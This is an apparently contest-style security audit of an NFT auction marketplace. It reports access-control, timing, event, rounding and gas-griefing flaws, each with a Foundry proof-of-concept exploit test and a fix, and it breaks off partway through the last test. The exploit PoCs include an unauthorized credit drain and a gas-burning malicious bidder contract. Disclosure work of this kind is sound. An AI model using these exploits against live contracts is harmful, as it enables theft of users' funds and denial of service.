# Title: Unauthorized NFT burning due to missing Access Control

# Lack of ownership checks in the `burn` function allows any caller to destroy others’ NFTs, causing permanent asset loss

## Description

* Like a typical ERC721 contract, the `burn` function inside the `BidBeasts_NFT_ERC721` contract is intended to allow the **owner of an NFT** to destroy (burn) their token, effectively removing it from circulation.

* However, that's not the case here. The `BidBeasts_NFT_ERC721::burn` function lacks any access control mechanism, meaning that **anyone** can call this function to burn **any** NFT, regardless of ownership. This is a significant security flaw as it allows malicious actors to destroy NFTs they do not own.

```solidity
@>      function burn(uint256 _tokenId) public { // @audit lacking access control, letting anyone burn it
            _burn(_tokenId);
            emit BidBeastsBurn(msg.sender, _tokenId);
        }
```

## Risk

**Likelihood**: High

* Any user with knowledge of the contract can call `burn` for any valid token ID, requiring only a valid transaction.

**Impact**: High

* In a less worse case, the NFT owner will get directly affected as their asset will vanish in the blink of an eye. There's no way to recover it as well.
* But, what if that NFT was in a mid-auction? Now, it not just affects the owner of the NFT, but also the **highest bidder** who might have placed a significant bid on it; his bid amount will be stuck in the contract, forever (see PoC).

## Proof of Concept

The following PoCs demonstrate two scenarios: (1) unauthorized burning of an owned NFT, and (2) burning an NFT mid-auction, locking bidder funds.

* First, add this `test_UnauthorizedBurn` in the test file.

    ```solidity
    function test_UnauthorizedBurn() public {
        // Let's mint an nft, using the modifier provided in the test file itself
        _mintNFT(); // SELLER is the owner of this NFT, token_id = 0

        // Checking whether SELLER owns the NFT or not...
        assertEq(nft.ownerOf(TOKEN_ID), SELLER, "SELLER should own the NFT");

        // Let's spawn a malicious actor: Charlie
        address charlie = makeAddr("Charlie");

        // Charlie decides to burn the NFT of SELLER
        vm.prank(charlie);
        nft.burn(TOKEN_ID);

        // Does this token still exists? Well, No!!
        vm.expectRevert("ERC721NonexistentToken(0)");
        nft.ownerOf(TOKEN_ID);
    }
    ```

* Run the above test using the following command:
  
    ```bash
    forge test --mt test_UnauthorizedBurn -vv
    ```

* Now, add the following `test_BurnDuringAuction` in the test file:

    ```solidity
    function test_BurnDuringAuction() public {
        // Minting and listing the NFT through modifiers
        _mintNFT(); // Again to SELLER, token_id = 0
        _listNFT(); // NFT is listed by SELLER, with min_price = 1 ether, buy_now_price = 5 ether

        // After listing, the token gets transferred to the marketplace contract
        // Thus, `market` is the new owner...Let's check it
        assertEq(nft.ownerOf(TOKEN_ID), address(market), "marketplace contract should own the NFT");

        // An Unlucky Bidder bids for it, hoping to get this precious gem
        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID); // BID_AMOUNT = 1.2 ether

        // Charlie gets revived again
        address charlie = makeAddr("Charlie");

        // As it's in the middle of an auction, Charlie decides to burn the NFT
        vm.prank(charlie);
        nft.burn(TOKEN_ID);

        // As expected, this NFT with token_id = 0 no longer exists
        vm.expectRevert("ERC721NonexistentToken(0)");
        nft.ownerOf(TOKEN_ID);

        // Now, SELLER feels like this is the highest bid he can get so far, and decides to take it
        vm.prank(SELLER);
        vm.expectRevert("ERC721NonexistentToken(0)"); // It's bound to fail, obviously
        market.takeHighestBid(TOKEN_ID);

        // The NFT gets vanished, and the BIDDER_1 hard-earned ether got stuck
        (, uint256 amount) = market.bids(TOKEN_ID);
        console.log("BIDDER_1 stuck amount:", amount); 
    }
    ```

* Run the above test using the command:

    ```bash
    forge test --mt test_BurnDuringAuction -vv
    ```

* The output we get from 2nd test:
  
    ```log
    Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
    [PASS] test_BurnDuringAuction() (gas: 279518)
    Logs:
    BIDDER_1 stuck amount: 1200000000000000000
    
    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.12ms (358.44µs CPU time)
    ```

## Recommended Mitigation

There's a need of access control on the `burn` function. Either include a direct check, or add an modifier instead:

```diff
contract BidBeasts is ERC721, Ownable(msg.sender) {
    /// Rest of the code

+   modifier onlyOwnerOfNFT(uint256 _tokenId) {
+       require(ownerOf(_tokenId) == msg.sender, "Not the Owner");
+       _;
+   }

    /// Rest of the code

-   function burn(uint256 _tokenId) public {
+   function burn(uint256 _tokenId) public onlyOwnerOfNFT(_tokenId) {
        _burn(_tokenId);
        emit BidBeastsBurn(msg.sender, _tokenId);
    }
}
```

---

# Title: Premature auction settlement before 3-Days deadline

# Missing enforcement of the 3-days auction duration allows early settlement, undermining bidding fairness and seller revenue

## Description

* The contract is intended to have the maximum auction duration of 3 days, as mentioned in the contest details: 
  > ### The contract also supports:
  > * Auction deadline of **exactly** 3 days.
  > * (Rest of the details...)

* Weirdly enough, there's no such logic in the contract that enforces this 3-day auction deadline. The only time-related logic present is the auction extension duration of 15 minutes (checkout `BidBeastsNFTMarketPlace::S_AUCTION_EXTENSION_DURATION`).

    ```solidity
    uint256 constant public S_AUCTION_EXTENSION_DURATION = 15 minutes;
    ```

* Subsequent bids placed within the final 15 minutes of the auction extend the duration by an additional 15 minutes, potentially allowing the auction to continue indefinitely as long as new bids are placed within this window and the seller does not invoke `takeHighestBid` to settle early.

    ```solidity
    // Lines 145 to 167 in placeBid function
    function placeBid(uint256 tokenId) external payable isListed(tokenId) {
        // ...
        if (previousBidAmount == 0) {
            requiredAmount = listing.minPrice;
            require(msg.value > requiredAmount, "First bid must be > min price");
    @>      listing.auctionEnd = block.timestamp + S_AUCTION_EXTENSION_DURATION;
            emit AuctionExtended(tokenId, listing.auctionEnd);
        } else {
            requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
            require(msg.value >= requiredAmount, "Bid not high enough");
            
            uint256 timeLeft = 0;
    @>      if (listing.auctionEnd > block.timestamp) {
    @>          timeLeft = listing.auctionEnd - block.timestamp;
            }
            if (timeLeft < S_AUCTION_EXTENSION_DURATION) {
    @>          listing.auctionEnd = listing.auctionEnd + S_AUCTION_EXTENSION_DURATION;
                emit AuctionExtended(tokenId, listing.auctionEnd);
            }
        }
    } 
    ```

* This deviation from the specified 3-day duration creates an issue where auctions may end prematurely after just 15 minutes if no further bids are placed, allowing a bidder to settle the auction via `settleAuction` at a potentially low price. This scenario undermine price discovery and user trust in the platform.

    ```solidity
        /**
         * @notice Settles the auction after it has ended. Can be called by anyone.
        */
        function settleAuction(uint256 tokenId) external isListed(tokenId) {
            Listing storage listing = listings[tokenId];
            require(listing.auctionEnd > 0, "Auction has not started (no bids)");
    @>      require(block.timestamp >= listing.auctionEnd, "Auction has not ended");
            require(bids[tokenId].amount >= listing.minPrice, "Highest bid did not meet min price");

            _executeSale(tokenId);
        }
    ```

## Risk

**Likelihood**: Medium

* Every auction starts with a 15-minute duration and may end prematurely if bidding is sparse, deviating from the 3-day requirement.

**Impact**: High/Medium

* **Economic Loss**: Sellers get significantly less price discovery (15 minutes vs 3 days)
* **Market Failure**: Auctions can't serve their purpose of finding fair market value
* **Specification Violation**: Contract doesn't meet its own stated requirements, a complete deviation from documented behavior
* **User Trust**: Undermines confidence in the platform

## Proof of Concept

* Add the following test `test_PrematureAuctionSettlement` in the test file:
  
    ```solidity
    function test_PrematureAuctionSettlement() public {
        // Minting and listing the NFT through modifiers
        _mintNFT();
        _listNFT();

        // An early bidder bids for it
        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        // Checking auction end time
        BidBeastsNFTMarket.Listing memory listing = market.getListing(TOKEN_ID);
        console.log("Initial Auction end time:", listing.auctionEnd); // 1 (block.timestamp) + 900 (15 minutes) = 901

        // Fast forward time by 15 minutes
        vm.warp(block.timestamp + 15 minutes);

        // BIDDER_1 settles the auction, as others missed the narrow window
        vm.prank(BIDDER_1);
        market.settleAuction(TOKEN_ID);

        // Checking ownership of the NFT
        assertEq(
            nft.ownerOf(TOKEN_ID),
            BIDDER_1,
            "NFT is still in contract"
        );
    }
    ```

* Run the above test using the command:
    
    ```bash
    forge test --mt test_PrematureAuctionSettlement -vv
    ```

## Recommended Mitigation

There are two ways to mitigate this issue. The protocol can choose any one of them, as it's a matter of preference how they want their auctions to be run:

1. **Enforce the 3-day auction deadline, while preventing sniping (Recommended)**: It's better to implement a hybrid model, set a fixed 3-day deadline on the first bid, then allow 15-minute extensions only for bids placed in the final 15 minutes of the current deadline. This ensures auctions last at least 3 days (preventing premature settlement) and extends only as needed for fairness, potentially going beyond 3 days in competitive cases, and thus preventing sniping.

    ```diff
    contract BidBeastsNFTMarket is Ownable(msg.sender) {
        // ...

        uint256 constant public S_AUCTION_EXTENSION_DURATION = 15 minutes;
    +   uint256 constant public S_AUCTION_DEADLINE = 3 days;

        // ...

        function placeBid(uint256 tokenId) external payable isListed(tokenId) {
            // ...
            if (previousBidAmount == 0) {
                requiredAmount = listing.minPrice;
                require(msg.value > requiredAmount, "First bid must be > min price");
    -           listing.auctionEnd = block.timestamp + S_AUCTION_EXTENSION_DURATION;
    +           listing.auctionEnd = block.timestamp + S_AUCTION_DEADLINE;
                emit AuctionExtended(tokenId, listing.auctionEnd);
            } else {
                requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
                require(msg.value >= requiredAmount, "Bid not high enough");

                uint256 timeLeft = 0;
                if (listing.auctionEnd > block.timestamp) {
                    timeLeft = listing.auctionEnd - block.timestamp;
                }
                if (timeLeft < S_AUCTION_EXTENSION_DURATION) {
                   listing.auctionEnd = listing.auctionEnd + S_AUCTION_EXTENSION_DURATION;
                    emit AuctionExtended(tokenId, listing.auctionEnd);
                }
            }
        }
    } 
    ```

2. **Update the documentation to reflect the actual behavior**: If the protocol prefers to keep the auction duration as it is, they should update their documentation and contest details to accurately represent the 15-minute auction extension logic. This ensures that users are well-informed about the auction mechanics and can adjust their bidding strategies accordingly.

---

# Title: Premature AuctionSettled event misleads on auction status

# Emitting `AuctionSettled` during `placeBid` misrepresents active auctions as settled, confusing users and off-chain systems

## Description

The `BidBeastsNFTMarketPlace::AuctionSettled` event is intended to signal the final settlement of an auction, indicating the winner, seller, and final price. However, it is incorrectly emitted in the `BidBeastsNFTMarketPlace::placeBid` function during regular bidding (not buy-now scenarios), despite the auction remaining active. This misrepresents the auction’s status, potentially confusing users and disrupting off-chain applications that rely on event logs.

```solidity
    // --- Buy Now Logic ---

    if (listing.buyNowPrice > 0 && msg.value >= listing.buyNowPrice) {
        ...
    }

    require(msg.sender != previousBidder, "Already highest bidder");
@>  emit AuctionSettled(tokenId, msg.sender, listing.seller, msg.value);

    // --- Regular Bidding Logic ---
```

## Risk

**Likelihood**: High

* Occurs for every regular bid placed in `placeBid`, excluding buy-now scenarios.

**Impact**: Low

* **User Confusion**: Users monitoring events think auction ended when it didn't
* **Integration Issues**: Off-chain applications (e.g., frontend, indexers) may incorrectly process auctions as settled, disrupting status displays or bidding interfaces.

## Proof of Concept

* To capture event emissions, import the `Vm` module in `BidBeastsMarketPlaceTest.t.sol`:

    ```solidity
        import {Test, console, Vm} from "forge-std/Test.sol";
    ```

* Next, add the following test to `BidBeastsMarketPlaceTest.t.sol`:

    ```solidity
        function test_PrematureAuctionSettledEmission() public {
            _mintNFT();
            _listNFT();
            
            // Place bid - this will incorrectly emit AuctionSettled
            vm.recordLogs();
            vm.prank(BIDDER_1);
            market.placeBid{value: BID_AMOUNT}(TOKEN_ID);
            
            Vm.Log[] memory logs = vm.getRecordedLogs();
            
            // Count AuctionSettled events (should be 0, but will be 1)
            uint256 settledEventCount = 0;
            for(uint i = 0; i < logs.length; i++) {
                if(logs[i].topics[0] == keccak256("AuctionSettled(uint256,address,address,uint256)")) {
                    settledEventCount++;
                }
            }

            console.log("AuctionSettled emitted during bidding:", settledEventCount);
            console.log("Auction still active?", market.getListing(TOKEN_ID).listed);
            
            // Now actually settle the auction
            vm.warp(block.timestamp + 16 minutes);
            vm.recordLogs();
            vm.prank(BIDDER_1);
            market.settleAuction(TOKEN_ID); // Emits `AuctionSettled` in `_executeSale()`
            
            logs = vm.getRecordedLogs();
            settledEventCount = 0;
            for(uint i = 0; i < logs.length; i++) {
                if(logs[i].topics[0] == keccak256("AuctionSettled(uint256,address,address,uint256)")) {
                    settledEventCount++;
                }
            }
            
            console.log("AuctionSettled emitted after settlement:", settledEventCount);
            console.log("Number of times 'AuctionSettled' got emitted: 2 (should be 1)");
        }
    ```

* Finally, run it using the command:

    ```bash
    forge test --mt test_PrematureAuctionSettledEmission -vv
    ```

* The output we get:

    ```log
    Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
    [PASS] test_PrematureAuctionSettledEmission() (gas: 330618)
    Logs:
    AuctionSettled event emitted during bidding: 1
    Auction still active? true
    AuctionSettled event emitted after settlement: 1
    Number of times 'AuctionSettled' event got emitted: 2 (should be 1)
    
    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.18ms (335.80µs CPU time)
    ```

## Recommended Mitigation

Simple, and straightforward. Just remove the `AuctionSettled` event from `placeBid` function as it doesn't belong there.

```diff
    // lines 142-143 in placeBid

    require(msg.sender != previousBidder, "Already highest bidder");
-   emit AuctionSettled(tokenId, msg.sender, listing.seller, msg.value);
```

---

# Precision loss in bid increment allows bids below 5% minimum

# Division-first calculation in `placeBid` causes precision loss due to truncation, enabling bids that violate the 5% minimum increment rule

## Description

* This contract makes sure that each new bid must be at least 5% higher than the previous one. The logic for this is implemented in the `BidBeastsNFTMarketPlace::placeBid` function (lines 156-157):

    ```solidity
        uint256 constant public S_MIN_BID_INCREMENT_PERCENTAGE = 5;
        ...

        // lines 156-157 in placeBid
    @>    requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
        require(msg.value >= requiredAmount, "Bid not high enough");
    ```

* The issue here is that the calculation `(previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE)` uses **division first** which truncates (integer division) and loses precision. This means that for certain bid amounts, the calculated `requiredAmount` can be lower than the intended 5% increase.

* There's a simple rule the calculations should follow - **Always Multiply Before Dividing**. Although many developers follow this rule, "Hidden Precision Loss" can still occur, resulting from complex calculations across different functions or contracts. But that's not the case here, as the calculation is straightforward.

    ```solidity
        // Bad
        uint256 result = (a / b) * c; // Division first, can lose precision
        // Better
        uint256 result = (a * c) / b; // Multiplication first, preserves precision
    ```

    * When we divide first, the fractional part is discarded completely. For example, if `a = 5`, `b = 3`, and `c = 6`, the bad approach gives `(5/3) * 6 = 1 * 6 = 6` (lost precision)
    * The good approach maintains precision longer (correct `(5 * 6) / 3 = 30 / 3 = 10` result).

* Hence, the correct way to calculate the minimum required bid should be:

    ```solidity
        requiredAmount = (previousBidAmount * (100 + S_MIN_BID_INCREMENT_PERCENTAGE)) / 100;
    ```

## Risk

**Likelihood**: Medium

* Occurs with certain bid amounts (not all)
* More likely with smaller bids or awkward decimal amounts (e.g., `1.200000000000099999 ETH`)

**Impact**: Medium

* **Minor Financial Loss**: Financial loss is typically small (few wei to small amounts).
* **Cumulative Effect**: Small losses may accumulate over multiple auctions.
* **Rule Violation**: Undermines the contract’s 5% bid increment requirement.

## Proof of Concept

* Add the following test `test_bidIncrementPrecisionLoss` in the test file:

    ```solidity
    function test_bidIncrementPrecisionLoss() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT(); // MIN_PRICE = 1 ether

        // Setting up an awkward bid amount that can cause precision loss
        uint256 bid_amount = 1.200000000000099999 ether;

        // Place first bid
        vm.prank(BIDDER_1);
        market.placeBid{value: bid_amount}(TOKEN_ID);

        (, uint256 amount) = market.bids(TOKEN_ID);
        console.log("First bid placed:", amount);

        // Calculating next minimum bids
        uint256 incorrectNextBidAmount = (amount / 100) * (100 + market.S_MIN_BID_INCREMENT_PERCENTAGE()); // S_MIN_BID_INCREMENT_PERCENTAGE = 5
        console.log("Incorrect next min bid (due to precision loss):", incorrectNextBidAmount);

        uint256 correctNextBidAmount = (amount * (100 + market.S_MIN_BID_INCREMENT_PERCENTAGE())) / 100;
        console.log("Correct next min bid (with actual 5% increase):", correctNextBidAmount);

        // Calculating difference between the two
        uint256 difference = correctNextBidAmount - incorrectNextBidAmount;
        console.log("Difference due to precision loss:", difference, "wei"); // Should be small but non-zero

        // 2nd bidder can easily place a bid with less than 5% increase due to this precision loss
        vm.prank(BIDDER_2);
        market.placeBid{value: incorrectNextBidAmount}(TOKEN_ID);

        (, amount) = market.bids(TOKEN_ID);
        console.log(); // just to give a space in console
        console.log("Placing second bid with incorrect min bid amount...");
        console.log("Second bid placed:", amount);
        assertLt(incorrectNextBidAmount, correctNextBidAmount, "Second bid is less than required 5% increase");
    }
    ```

* Run the above test using the command:

    ```bash
    forge test --mt test_bidIncrementPrecisionLoss -vv
    ```

* The output we get:

    ```log
    Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
    [PASS] test_bidIncrementPrecisionLoss() (gas: 326643)
    Logs:
    First bid placed: 1200000000000099999
    Incorrect next min bid (due to precision loss): 1260000000000104895
    Correct next min bid (with actual 5% increase): 1260000000000104998
    Difference due to precision loss: 103 wei
    
    Placing second bid with incorrect min bid amount...
    Second bid placed: 1260000000000104895

    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.02ms (244.80µs CPU time) 
    ```

## Recommended Mitigation

Simply change the calculation to multiply first, then divide:

```diff
    // lines 156-157 in placeBid
-   requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
+   requiredAmount = (previousBidAmount * (100 + S_MIN_BID_INCREMENT_PERCENTAGE)) / 100;
    require(msg.value >= requiredAmount, "Bid not high enough");
```

---

# Strict Greater-Than check prevents minimum price bidding

# Inconsistent validation logic prevents bidding at seller-defined minimum price

## Description

* For this auction, there's a `BidBeastsNFTMarketPlace::Listing.minPrice` set by the seller, which, as the name suggests, is the minimum price at which the seller is willing to sell their NFT.

* But, the contract enforces that the **first bid** must be strictly greater than this `minPrice`, preventing bids exactly at `minPrice`.(line 151 in `BidBeastsNFTMarketPlace::placeBid`):

    ```solidity
        if (previousBidAmount == 0) {

            requiredAmount = listing.minPrice;
    @>     require(msg.value > requiredAmount, "First bid must be > min price");
    ```

* Plus, it can be seen that both `BidBeastsNFTMarketPlace::settleAuction` and `BidBeastsNFTMarketPlace::takeHighestBid` functions checks if the highest bid is **greater than or equal to** (`>=`) the `minPrice`, indicating the seller's intent to accept bids at `minPrice` (lines 186 and 196 respectively):

    ```solidity
        function settleAuction(uint256 tokenId) external isListed(tokenId) {
            ...
    @>      require(bids[tokenId].amount >= listing.minPrice, "Highest bid did not meet min price");
            ...
        }

        function takeHighestBid(uint256 tokenId) external isListed(tokenId) isSeller(tokenId, msg.sender) {
            ...
    @>      require(bid.amount >= listings[tokenId].minPrice, "Highest bid is below min price");
            ...
        }
    ```

* This discrepancy forces bidders to overpay by at least 1 wei, creating unnecessary friction.

## Risk

**Likelihood**: Medium

* Occurs when a bidder tries to bid exactly at `minPrice` for the first bid.

**Impact**: Low

* Bidders can't bid at the exact minimum price
* No funds at risk, just a minimal overpayment of 1 wei

## Proof of Concept

* Add the following test `test_cannotBidAtMinPrice` in the test file:

    ```solidity
    function test_cannotBidAtMinPrice() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT(); // MIN_PRICE = 1 ether
        console.log("Minimum price set at:", MIN_PRICE);

        // Attempt to place a bid exactly at min price
        vm.prank(BIDDER_1);
        vm.expectRevert("First bid must be > min price");
        market.placeBid{value: MIN_PRICE}(TOKEN_ID);

        // Place a valid first bid above min price
        uint256 validBid = MIN_PRICE + 1 wei;
        vm.prank(BIDDER_1);
        market.placeBid{value: validBid}(TOKEN_ID);

        (, uint256 amount) = market.bids(TOKEN_ID);
        console.log();
        console.log("Valid first bid placed:", amount);
    }
    ```

* Run the above test using the command:

    ```bash
    forge test --mt test_cannotBidAtMinPrice -vv
    ```

* The output we get:

    ```log
    Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
    [PASS] test_cannotBidAtMinPrice() (gas: 309520)
    Logs:
    Minimum price set at: 1000000000000000000
    
    Valid first bid placed: 1000000000000000001

    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.14ms (197.40µs CPU time) 
    ```

## Recommended Mitigation

Change the strict greater-than (`>`) to greater-than-or-equal-to (`>=`) in the `placeBid` function:

```diff
    // line 151 in placeBid
-   require(msg.value > requiredAmount, "First bid must be > min price");
+   require(msg.value >= requiredAmount, "First bid must be >= min price");
```

---

# Unauthorized withdrawal of failed transfer credits

# Lack of access control in `withdrawAllFailedCredits` allows anyone to drain users’ credits, risking significant contract funds

## Description

* The contract implements a pull mechanism to handle failed Ether transfers by crediting the amount to the user's account, which they can later withdraw using the `BidBeastsNFTMarketPlace::withdrawAllFailedCredits` function.

* The intention was good, but the implementation got flawed a bit, leading to a devastating vulnerability. The `withdrawAllFailedCredits` function lacks any access control, meaning **anyone** can call this function to withdraw the failed transfer credits of **any** user. All one has to do is provide the target user's address as the `_receiver` parameter.

    ```solidity
    @>  function withdrawAllFailedCredits(address _receiver) external {
    @>      uint256 amount = failedTransferCredits[_receiver]; // @audit calculates the amount based on _receiver, not msg.sender
            require(amount > 0, "No credits to withdraw");
            
    @>        failedTransferCredits[msg.sender] = 0; // @audit sets msg.sender's credits to 0, not _receiver's
            
    @>        (bool success, ) = payable(msg.sender).call{value: amount}(""); // @audit sends the amount to msg.sender, not _receiver
            require(success, "Withdraw failed");
        }
    ```

* The surprising part is, it doesn't just drain the credits of the `_receiver`, but also **gives the opportunity to withdraw again and again if the contract has enough balance**. This is because the function sets the `failedTransferCredits` of `msg.sender` to 0, not `_receiver`.

## Risk

**Likelihood**: High

* Any caller can exploit this by targeting any address with non-zero `failedTransferCredits`

**Impact**: High

* **Financial Loss**: Unauthorized withdrawal of users’ failed transfer credits.
* **Contract Balance Drain**: Repeated withdrawals can deplete the contract’s balance, affecting all users.

## Proof of Concept

* First, take a look at already implemented `RejectEther` contract in the test file at line 9. This contract is used to simulate a user who rejects incoming Ether transfers, causing the transfer to fail and credits to be recorded. We will be using it in our PoC.

    ```solidity
        // A mock contract that cannot receive Ether, to test the payout failure logic.
        contract RejectEther {
            // Intentionally has no payable receive or fallback
        }

        ...

        RejectEther rejector; // Initialized as rejector = new RejectEther(); in setUp()
    ```

* Next, add the following test `test_UnauthorizedCreditWithdrawal` in the test file:

    ```solidity
    function test_UnauthorizedCreditWithdrawal() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT();

        // funding some eth to rejector contract
        vm.deal(address(rejector), 10 ether);

        // Placing a initial bid through the rejector contract, which can't receive the ether
        vm.prank(address(rejector));
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);
        console.log("Rejector places a bid of:", BID_AMOUNT);

        // BIDDER_1 immediately buys the NFT at buy now price, causing payout of rejector to fall in `failedTransferCredits`
        vm.prank(BIDDER_1);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
        console.log("BIDDER_1 buys the NFT at buy now price:", BUY_NOW_PRICE, "leading to payout failure for rejector");
        console.log();

        uint256 failedAmount = market.failedTransferCredits(address(rejector));
        console.log("Rejector's failed transfer credits:", failedAmount);

        uint256 contractBalanceBefore = address(market).balance;
        uint256 bidder2BalanceBefore = address(BIDDER_2).balance;
        console.log();
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("BIDDER_2 balance before:", bidder2BalanceBefore);

        // BIDDER_2 maliciously withdraws rejector’s credits
        vm.prank(BIDDER_2);
        market.withdrawAllFailedCredits(address(rejector));
        console.log();
        console.log("BIDDER_2 maliciously withdraws rejector's credits...");

        console.log();
        console.log("BIDDER_2 balance after:", address(BIDDER_2).balance);
        console.log("Contract balance after:", address(market).balance);
        assertEq(
            market.failedTransferCredits(address(rejector)),
            failedAmount,
            "Rejector's credits should remain unchanged"
        );

        // Gives the opportunity to withdraw again and again if contract has enough balance and `failedTransferCredits` of some address is non-zero
    } 
    ```

* Run the above test using the command:

    ```bash
    forge test --mt test_UnauthorizedCreditWithdrawal -vv
    ```

* The output we get:

    ```log
    Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
    [PASS] test_UnauthorizedCreditWithdrawal() (gas: 363480)
    Logs:
    Rejector places a bid of: 1200000000000000000
    BIDDER_1 buys the NFT at buy now price: 5000000000000000000 leading to payout failure for rejector
    
    Rejector's failed transfer credits: 1200000000000000000
    
    Contract balance before: 1450000000000000000
    BIDDER_2 balance before: 100000000000000000000
    
    BIDDER_2 maliciously withdraws rejector's credits...
    
    BIDDER_2 balance after: 101200000000000000000
    Contract balance after: 250000000000000000

    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.02ms (264.85µs CPU time) 
    ```

## Recommended Mitigation

The `withdrawAllFailedCredits` function should be restricted so that only the owner of the credits (i.e., `msg.sender`) can withdraw their own credits. This can be done by removing the `_receiver` parameter and using `msg.sender` directly. Optionally, add an event (e.g., `CreditsWithdrawn(address, uint256)`) for transparency.

```diff
+    event CreditsWithdrawn(address indexed user, uint256 amount);
+
-    function withdrawAllFailedCredits(address _receiver) external { 
+    function withdrawAllFailedCredits() external {
-       uint256 amount = failedTransferCredits[_receiver];
+       uint256 amount = failedTransferCredits[msg.sender];
        require(amount > 0, "No credits to withdraw");
        
        failedTransferCredits[msg.sender] = 0;
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdraw failed");
+       emit CreditsWithdrawn(msg.sender, amount);
    }
```

---

# Unbounded gas in _payout enables Economic DoS attacks

# Unbounded `.call` in `_payout` allows gas-intensive receive functions, inflating bidding costs and deterring legitimate bidders

## Description

* Whenever someone places a new bid using `BidBeastsNFTMarketPlace::placeBid`, the contract attempts to pay out the previous highest bidder through `BidBeastsNFTMarketPlace::_payout` function:

    ```solidity
        // lines 127-129 in placeBid
        if (previousBidder != address(0)) {
    @>      _payout(previousBidder, previousBidAmount);
        }

        ...

        // lines 172-174 in placeBid
        if (previousBidder != address(0)) {
    @>      _payout(previousBidder, previousBidAmount);
        }

        ...

        // lines 227-233
    @>  function _payout(address recipient, uint256 amount) internal {
            if (amount == 0) return;
    @>      (bool success, ) = payable(recipient).call{value: amount}("");
            if (!success) {
                failedTransferCredits[recipient] += amount;
            }
        }
    ```

* This `_payout` function implements a **"partial pull-based mechanism"** for the refunds. The reason I say "partial" is because, at first it tries to send the Ether directly to the previous bidder using a low-level call. If that fails, then it credits the amount to `failedTransferCredits`, allowing the user to withdraw it later.

* But that's where an issue is hiding in a plain sight. Picture this:
    * Alice wants an NFT so bad that she doesn't mind doing some malicious activities to get it.
    * For this, she creates a contract to bid for the NFT, but in a way that if someone tries to send her Ether, it will consume a lot of gas. Something like this:

        ```solidity
            receive() external payable {
                for (uint256 i = 0; i < 2435000; i++) {
                    i * i;
                }
            }
        ```
    
    * After placing the bid, Alice's contract becomes the highest bidder so far. But then Bob appears, in hope to win the auction, and places a more higher bid.
    * However, when Bob's bid will be in process, the contract tries to pay out Alice (the previous highest bidder) by calling her contract's `receive` function.
    * Since Alice's `receive` function is designed to consume a lot of gas, it will be really expensive for Bob to place his bid, and probably makes him think twice before making the decision.
    * If Alice keeps doing this, it can lead to a situation where no one else can afford to outbid her, effectively locking the auction in her favor.

* This is a classic example of an **economic denial of service (EDoS) attack**, where the attacker exploits the gas consumption to make it economically unfeasible for others to participate in the auction.

## Risk

**Likelihood**: High

* This auction doesn't restrict contracts from bidding, making it easy for attackers to exploit this vulnerability.

**Impact**: High

* **Auction Manipulation**: Attackers can deter legitimate bidders, dominating auctions.
* **Financial Loss**:
    * **For Bidders**: Legitimate bidders may lose out on winning auctions due to high gas costs, and those who attempt to bid will pay exorbitant gas fees.
    * **For Sellers**: Sellers may receive lower final prices for their NFTs as fewer bidders participate.

## Proof of Concept

* Add this `MaliciousBidder` contract in the test file:

    ```solidity
    contract MaliciousBidder {
        BidBeastsNFTMarket public market;

        constructor(address _market) {
            market = BidBeastsNFTMarket(_market);
        }

        function bid(uint256 tokenId) public payable {
            market.placeBid{value: msg.value}(tokenId);
        }

        receive() external payable {
            // One of the ways to consume a lot of gas
            for (uint256 i = 0; i < 2435000; i++) {
                i * i;
            }
        }
    }
    ```

* After that, add this particular `test_dosAttackViaMaliciousContract` test in the test file:

    ```solidity
    function test_dosAttackViaMaliciousContract() public {
        // First, let's mint and list nft
        _mintNFT();
        _listNFT();

        // Set a gas price (trying to keep it realistic, one can easily pick the latest one from: https://etherscan.io/gastracker)
        uint256 currentGasPrice = 392000000; // 0.392 gwei in wei
        vm.txGasPrice(currentGasPrice);

        console.log("=== DoS Attack Cost Analysis ===");
        console.log("Gas price set to:", currentGasPrice, "wei (0.392 gwei)");

        // Let's deploy the maliciousBidder contract
        MaliciousBidder maliciousBidder = new MaliciousBidder(address(market));

        // Gas at the start
        uint256 gasStart = gasleft();

        // placing bid through maliciousBidder contract
        maliciousBidder.bid{value: BID_AMOUNT}(TOKEN_ID);

        uint256 afterMaliciousBidderCall = gasStart - gasleft();
        console.log();
        console.log("MaliciousBidder placed initial bid");
        console.log("Gas used in MaliciousBidder call (normal scenario):", afterMaliciousBidderCall);

        // Now let's play the role of BIDDER_1, which actually decided to buy the nft right away
        uint256 bidderGasStart = gasleft();
        vm.prank(BIDDER_1);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
        console.log();
        console.log("BIDDER_1 placed the next bid");

        uint256 afterBidder1Call = bidderGasStart - gasleft();
        console.log("Gas used in BIDDER_1 call (expensive scenario):", afterBidder1Call);

        // Calculate real-world costs (approx.)
        uint256 costInWei = afterBidder1Call * currentGasPrice;

        console.log();
        console.log("=== ATTACK RESULTS ===");
        console.log("Gas units consumed by victim (BIDDER_1):", afterBidder1Call);
        // Try using https://eth-converter.com/ to convert wei to eth or usd
